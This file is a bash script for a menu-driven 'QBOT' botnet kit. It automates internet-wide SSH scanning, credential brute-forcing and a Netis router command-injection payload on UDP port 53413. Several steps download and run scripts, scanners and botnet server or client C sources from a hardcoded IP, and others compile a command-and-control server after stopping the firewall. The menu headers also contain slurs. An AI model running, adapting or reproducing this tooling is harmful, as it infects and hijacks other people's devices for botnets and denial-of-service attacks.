#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
ULG='\e[4;1;32m'
WHITE='\e[1;37m'
NC='\e[0m'
clear
tput civis
who am i >> logs.txt
echo -n -e "${WHITE}Booting Up Menu.. \r"
sleep 1.5
echo -n -e "${WHITE}Loading Menu [${RED}##                       ${WHITE}(8%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}########                 ${WHITE}(38%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}##########               ${WHITE}(49%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}################         ${WHITE}(80%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}#######################${WHITE}] (100%) ${RED}Finished"
sleep 2
echo -ne '\n'
tput cnorm
while true
do
clear
echo -e "
 ${BLUE} ██████╗ ██████╗  ██████╗ ████████╗███████╗███████╗████████╗██╗   ██╗██████╗ 
 ${BLUE}██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗
 ${BLUE}██║   ██║██████╔╝██║   ██║   ██║   ███████╗█████╗     ██║   ██║   ██║██████╔╝
 ${BLUE}██║▄▄ ██║██╔══██╗██║   ██║   ██║   ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝ 
 ${BLUE}╚██████╔╝██████╔╝╚██████╔╝   ██║   ███████║███████╗   ██║   ╚██████╔╝██║     
 ${BLUE} ╚══▀▀═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝
"
echo -e "${WHITE}Created By${WHITE} [${LIGHTCYAN}@FlexingOnLamers${WHITE}]"
echo -e "${LIGHTBLUE}NET  ${WHITE}To See The Full List OF Commands for Net setups etc "
echo -e "${LIGHTBLUE}SCAN ${WHITE}To See The Full List OF Commands for Scanning "
echo -e -n "${WHITE}Users Online:${LIGHTRED} "
users | wc -w
echo -e "\n"
echo -e ""
echo -e ""
echo -e ""
echo -e ""
echo -e -n "${WHITE}root@${LIGHTRED}QBOT${WHITE} ~]# \c"
read answer
if [[ $answer == SCAN ]]
then
clear
echo -e ""
echo -e "${RED}                                 [${WHITE}+${RED}]${LIGHTCYAN}Commands You Queer${RED}[${WHITE}+${RED}]                                "
echo -e ""
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}After running AWS please go into w.pl and wget.pl and change the IP to yours within the char line "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}AWS     ${WHITE}Installs All Updates, LRAB, ZMAP, MASSCAN   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}ZMAPLST ${WHITE}Scans Selected lst File to scan from   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}ZMAP    ${WHITE}Scan the world! (zmap)   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}MASSSCAN${WHITE}Scan Desired Ranges for MASSSCAN   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}NetScan ${WHITE}Scans Netis   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}NetLoad ${WHITE}Loads Netis  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}LRAB    ${WHITE}Scans Selected  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}CPAN    ${WHITE}Fixes Any CPAN Errors  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}NETSSH2 ${WHITE}Fixes Any netssh2 Errors  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}UPDATE  ${WHITE}Updates Lists  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}DUPES   ${WHITE}Moves all (usable) bots to desired file "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}LOAD    ${WHITE}Loads Bots to net  "
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
read
fi
if [[ $answer == NET ]]
then
clear
echo -e ""
echo -e "${RED}                                 [${WHITE}+${RED}]${LIGHTCYAN}Commands You Queer${RED}[${WHITE}+${RED}]                                "
echo -e ""
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}ServerSide         ${WHITE}Shows A List of downloadable Server sides   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Clents             ${WHITE}Shows A List of downloadable Clients   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Compile            ${WHITE}Compiles your client and net   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Screen             ${WHITE}Screens your net on your desired port  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}BEFORE COMPILING DOWNLOAD A CLIENT FIRST IN (Clients)"
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}QUICK     ${WHITE}Personal Setup For Cri (quicknet)   "
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
read
fi
if [[ $answer == ServerSide ]]
then
clear
echo -e ""
echo -e "${RED}                                 [${WHITE}+${RED}]${LIGHTCYAN}Commands You Queer${RED}[${WHITE}+${RED}]                                "
echo -e ""
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Slav          ${WHITE}Downloads And compiles Slav.c and adds user and pass   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Google        ${WHITE}Downloads Google Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Purgev4       ${WHITE}Downloads Purgev2 Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Purgev3       ${WHITE}Downloads Purgev3 Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Purgev9       ${WHITE}Downloads Purgev9 Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Doom          ${WHITE}Downloads Doom Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}UNIX          ${WHITE}Downloads UNIX Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}HACKER        ${WHITE}Downloads HACKER Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}LoveSec       ${WHITE}Downloads LoveSec Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}LOIC          ${WHITE}Downloads LOIC Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}DARKRAI       ${WHITE}Downloads DARKRAI Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}OMY           ${WHITE}Downloads OMY Server side and adds user and pass    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}ColtSec       ${WHITE}Downloads COLTSEC Server side and adds user and pass    "
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
read
fi
if [[ $answer == Clients ]]
then
clear
echo -e ""
echo -e "${RED}                                 [${WHITE}+${RED}]${LIGHTCYAN}Commands You Queer${RED}[${WHITE}+${RED}]                                "
echo -e ""
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Note, after downloading a client you must go onto the client and edit the IPs to match your server IP   "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}EDITC          ${WHITE}Opens Client File And allows you to edit it    "
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}GhostSec       ${WHITE}Downloads Ghostsec Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Hera           ${WHITE}Downloads Hera Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}idiot          ${WHITE}Downloads idiot Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}inuyasha       ${WHITE}Downloads inuyasha Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Katrinav2      ${WHITE}Downloads Katrinav2 Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}UNIXC           ${WHITE}Downloads UNIX Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Nazi           ${WHITE}Downloads Nazi Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Zekron         ${WHITE}Downloads Zekron Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}ZoneSec        ${WHITE}Downloads ZoneSec Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Dome           ${WHITE}Downloads OG Dome Client    "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Colt           ${WHITE}Downloads Colt Client    "
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
read
fi
if [[ $answer == AWS ]]
then
clear
echo -e ""

sleep 1

yum update -y

yum install python-paramiko gcc screen nano wget httpd iptables perl -y

yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y

yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y

yum install epel-release -y

yum install gengetopt -y

yum install python-paramiko gcc screen nano wget httpd iptables perl -y

yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y

yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y

yum install epel-release -y

yum install gengetopt -y

echo -e "${LIGHTCYAN}Updates Installed.."
sleep 1
echo -e "${LIGHTRED}Now installing ZMAP${LIGHTGREEN}"
sleep 1
echo -e ""
wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz

tar -xvf v2.1.0.tar.gz

cd zmap-2.1.0

flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"

byacc -d -o "src/parser.c" "src/parser.y"

mkdir /etc/zmap

cp conf/* /etc/zmap

cmake -DENABLE_HARDENING=ON

make

make install

cd

echo -e "${LIGHTCYAN}ZMAP Finished Installing.."
sleep 1.0
echo -e "${LIGHTRED}Now Installing NETSSH and Running Scanner.sh..${LIGHTGREEN}"
sleep 1.0
echo -e ""
yum install cpan wget curl glibc.i686 -y
cpan force install Parallel::ForkManager
cpan force install IO::Socket
cpan force install IO::Select
sleep 2
wget http://rbxmarketsourcealso000isbae.000webhostapp.com/compile.sh; sh compile.sh; rm -rf compile.sh
sleep 2
yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap -y
pecl install -f ssh2
touch /etc/php.d/ssh2.ini
echo extension=ssh2.so > /etc/php.d/ssh2.ini
cpan force install Net::SSH2

cd

echo -e "${LIGHTCYAN}Finished!"
sleep 1.0
echo -e "${LIGHTRED}Now Installing LRAB... ${LIGHTGREEN}"
sleep 1.0
echo -e ""
wget -q http://74.91.122.216/class -O class

wget -q http://74.91.122.216/dup -O dup

wget -q http://74.91.122.216/g -O g

wget -q http://74.91.122.216/update -O update

wget -q http://74.91.122.216/pass_file -O pass_file

wget -q http://74.91.122.216/s -O s

wget -q http://74.91.122.216/w.pl -O w.pl

wget -q http://74.91.122.216/wget.pl -O wget.pl

echo -e "${LIGHTCYAN}LRAB Finished Installing.."
sleep 1.0
echo -e "${LIGHTCYAN}WGET Files Finished Installing.."
sleep 1.0
echo -e "${LIGHTRED}Now Installing MassScan..${LIGHTGREEN}"
sleep 1.0
echo -e ""
wget -q http://74.91.122.216/masscan -O masscan
echo -e "${LIGHTCYAN}Massscan finished installing.."
sleep 1.0
echo -e "${LIGHTRED}Now Setting Up Netis Scanning${LIGHTGREEN}"
sleep 1.0
echo -e ""
python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
echo -e ""
echo -e "${WHITE} Enter Infect Line (WGET):${LIGHTRED} \c"
read WGET
clear
echo -e ""
python -c "print 'AA\x00\x00AAAA $WGET\x00'" > commandpayload

echo -e "${LIGHTCYAN}Netis Setup Finished.."
sleep 1.0
echo -e "${LIGHTRED}Now Downloading Files For Net..${LIGHTGREEN}"
sleep 1.0
echo -e ""
wget -q http://74.91.122.216/cc7.py -O cc7.py

read
fi
if [[ $answer == CPAN ]]
then
clear
echo -e ""
wget http://search.cpan.org/CPAN/authors/id/D/DL/DLUX/Parallel-ForkManager-0.7.5.tar.gz
tar -xvf Para*
cd Para*
perl Makefile.PL
make
make install
cd ../
rm -rf Para*
wget http://www.cpan.org/authors/id/S/SA/SALVA/Net-SSH2-0.59_23.tar.gz
tar -xvf Net*
cd Net*
perl Makefile.PL
make
make install
cd ../
rm -rf Net*

read
fi
if [[ $answer == NETSSH2 ]]
then
clear
echo -e ""
yum install gcc  cpan php-pear php-devel libssh2 libssh2-devel -y
pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo
extension=ssh2.so>/etc/php.d/ssh2.ini
cpan -fi Net::SSH2
cpan -fi Parallel::ForkManager

read
fi
if [[ $answer == ZMAPLST ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter lst File to scan:${LIGHTRED} \c"
read name
clear
echo -e ""
echo -e "${WHITE} Enter Port To Scan (22 is main):${LIGHTRED} \c"
read port
clear
echo -e ""
zmap -p$port -w $name.lst -o mfu.txt -B1000M

read
fi
if [[ $answer == ZMAP ]]
then
clear
echo -e ""
zmap -p22 -o mfu.txt -B1000M
read
fi
if [[ $answer == MASSSCAN ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter Range to scan (IP):${LIGHTRED} \c"
read IP
clear
echo -e ""
echo -e "${WHITE} Enter Port To Scan (22 is main):${LIGHTRED} \c"
read port
clear
echo -e ""
./masscan $IP/8 -p$port --rate 10000 -oG ips.txt

grep -oP '(?<=Host: )\S*' ips.txt > mfu.txt


read
fi
if [[ $answer == NetScan ]]
then
clear
echo -e ""
zmap -M udp -p53413 --probe-args=file:loginpayload
read
fi
if [[ $answer == NetLoad ]]
then
clear
echo -e ""
zmap -M udp -p53413 --probe-args=file:commandpayload
read
fi
if [[ $answer == LRAB ]]
then
clear
echo -e "${WHITE} Enter Range to scan ex:122:${LIGHTRED} \c"
read range
clear
echo -e ""
./class 22 -a $range -i eth0 -s 10

cat bios.txt | sort | uniq >mfu.txt; rm -rf bios.txt

./update 1200

cat vuln.txt | grep -v DUP >vuln

perl w.pl

read
fi
if [[ $answer == UPDATE ]]
then
clear
echo -e ""
./update 1500
read
fi
if [[ $answer == LOAD ]]
then
clear
echo -e "${WHITE} Enter File You are scanning ex:cri.txt:${LIGHTRED} \c"
read File
clear
echo -e ""
perl w.pl $File
read
fi
if [[ $answer == DUPES ]]
then
clear
echo -e "${WHITE} Enter Full FileName To load Bots to ex:Cri.txt :${LIGHTRED} \c"
read File
clear
echo -e ""
cat vuln.txt | grep -v DUP > $File
read
fi
if [[ $answer == COMPILE ]]
then
clear
echo -e "${WHITE} Enter Your Server IP:${LIGHTRED} \c"
read IP
clear
echo -e ""
python cc7.py client.c $IP
read
fi
if [[ $answer == QUICK ]]
then
clear
echo -e "${WHITE} Enter Your Server IP:${LIGHTRED} \c"
read IP
clear
echo -e ""

wget -q http://74.91.122.216/slavclient.c -O client.c

python cc7.py client.c $IP

wget -q http://74.91.122.216/slav.c -O server.c

gcc server.c -o server -pthread

echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > slav.txt

echo -e "${WHITE} Enter Port to screen on:${LIGHTRED} \c"
read PORT
clear
echo -e ""

service iptabes stop 
service httpd restart

systemctl stop firewalld
httpd -k restart
httpd -krestart

screen ./server 23 1 $PORT

read
fi
if [[ $answer == Purgev3 ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/PURGE%20V3%20SERVERSIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == Purgev4 ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/PURGE%20V4%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == Google ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/GOOGLE%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == Purgev9 ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/PURGE%20BUILD%20V9%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == Slav ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/slav.c -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > slav.txt
read
fi
if [[ $answer == ColtSec ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/COLTSEC%20SERVERSIDE%20BUILD%20V1.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == LOIC ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/LOIC%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == OMY ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/OMY%20SERVER%20SIDE.TXT -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == UNIX ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/UNIX%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == LoveSec ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/FBI%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt
read
fi
if [[ $answer == HACKER ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/HACKER%20SERVER%20SIDE.txt -O server.c
gcc server.c -o server -pthread
echo -e ""
echo -e "${WHITE} Enter Desired Username:${LIGHTRED} \c"
read user
clear
echo ""
echo -e "${WHITE} Enter Desired Password:${LIGHTRED} \c"
read pass
clear
echo -e ""
echo -e "$user $pass" > login.txt

read
fi
if [[ $answer == GhostSec ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/ghostsec%20client.c -O client.c
read
fi
if [[ $answer == idiot ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/idiot.c -O client.c
read
fi
if [[ $answer == Hera ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/Hera%20client%20.c -O client.c
read
fi
if [[ $answer == inuyasha ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/Inuyasha_GHP_client.c -O client.c
read
fi
if [[ $answer == Katrinav2 ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/KATRINA%20V2%20CLIENT.C.txt -O client.c
read
fi
if [[ $answer == UNIXC ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/UNIX%20CLIENT.c -O client.c
read
fi
if [[ $answer == Nazi ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/naziclient.c -O client.c
read
fi
if [[ $answer == Zekron ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/Zekrom_client.c -O client.c
read
fi
if [[ $answer == ZoneSec ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/ZONESEC%20CLIENT.c -O client.c
read
fi
if [[ $answer == Dome ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/client.c -O client.c
read
fi
if [[ $answer == Colt ]]
then
clear
echo -e ""
wget -q http://74.91.122.216/slavclient.c -O client.c
read
fi
if [[ $answer == EDITC ]]
then
clear
echo -e ""
nano client.c
read
fi
if [[ $answer == Screen ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter your Bot Port:${LIGHTRED} \c"
read BPORT
clear
echo -e ""
echo -e "${WHITE} Enter Desired Threads:${LIGHTRED} \c"
read THREADS
clear
echo -e ""
echo -e "${WHITE} Enter Port To Screen Net On:${LIGHTRED} \c"
read PORT
clear
echo -e ""

service iptabes stop 
service httpd restart

systemctl stop firewalld
httpd -k restart
httpd -krestart

screen ./server $BPORT $THREADS $PORT
read
fi
done
